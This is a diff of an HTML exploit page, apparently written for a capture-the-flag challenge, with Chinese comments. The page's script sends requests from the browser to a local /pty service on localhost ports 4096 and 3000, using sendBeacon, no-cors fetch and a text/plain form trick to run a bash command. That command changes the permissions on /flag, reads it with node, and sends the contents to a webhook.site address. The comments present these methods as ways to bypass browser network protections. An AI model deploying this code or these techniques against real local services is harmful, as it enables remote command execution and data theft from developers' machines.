@@ -2,45 +2,55 @@
 <html>
 <body>
     <script>
-        const WEBHOOK = 'https://webhook.site/6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
+        // 【注意】请确保此 ID 是你 Webhook.site 页面上显示的那个
+        const WEBHOOK_ID = '6c7b9fec-12ce-4d1c-b5ce-5938576168f4';
+        const WEBHOOK_URL = `https://webhook.site/${WEBHOOK_ID}`;
         
-        // 信号：开始最后一次尝试
-        fetch(`${WEBHOOK}?status=last_resort_attempt`);
+        // 信号确认：Bot 已上线
+        fetch(`${WEBHOOK_URL}?status=ultimate_attack_start`);
 
-        // 构建命令：读取 flag 并通过 curl 或 node 回传
-        // 增加了一个 000 权限绕过逻辑：虽然我们是 node 用户，
-        // 但有时直接读取 000 文件会失败，尝试先 chmod 444
-        const cmd = `chmod 444 /flag && node -e "fetch('${WEBHOOK}?flag=' + encodeURIComponent(require('fs').readFileSync('/flag', 'utf8')))"`;
+        // 核心命令：修改权限 -> 读取文件 -> 发送请求
+        const cmd = `chmod 444 /flag && node -e "const fs=require('fs'); const data=fs.readFileSync('/flag','utf8'); fetch('${WEBHOOK_URL}?flag='+encodeURIComponent(data))"`;
 
         const payload = JSON.stringify({
             command: '/bin/bash',
             args: ['-c', cmd]
         });
 
-        // 策略 1: 使用 localhost 替代 127.0.0.1
-        function tryPort(port) {
-            const targets = [
-                `http://localhost:${port}/pty`,
-                `http://127.0.0.1:${port}/pty`
-            ];
+        async function attack(host, port) {
+            const target = `http://${host}:${port}/pty`;
 
-            targets.forEach(url => {
-                // A. 尝试 sendBeacon
-                try {
-                    navigator.sendBeacon(url, new Blob([payload], {type: 'text/plain'}));
-                } catch(e) {}
+            // 方式 A: Navigator Beacon (绕过 PNA 限制的常用手段)
+            navigator.sendBeacon(target, new Blob([payload], {type: 'text/plain'}));
 
-                // B. 尝试 fetch no-cors
-                fetch(url, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: payload
-                }).catch(e => {});
-            });
+            // 方式 B: fetch no-cors (强制发送)
+            fetch(target, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: payload
+            }).catch(() => {});
         }
 
-        // 循环尝试端口
-        [4096, 3000].forEach(p => tryPort(p));
+        // 尝试所有可能的地址组合
+        const ports = [4096, 3000];
+        const hosts = ['localhost', '127.0.0.1', '0.0.0.0'];
+
+        hosts.forEach(h => ports.forEach(p => attack(h, p)));
+
+        // 方式 C: 顶级导航表单（最后的绝招，绕过所有 Mixed Content 限制）
+        setTimeout(() => {
+            const f = document.createElement('form');
+            f.action = 'http://localhost:4096/pty';
+            f.method = 'POST';
+            f.enctype = 'text/plain';
+            const i = document.createElement('input');
+            i.name = payload; // 将 JSON 注入键名
+            i.value = '';
+            f.appendChild(i);
+            document.body.appendChild(f);
+            f.submit();
+        }, 2000);
+
     </script>
 </body>
 </html>
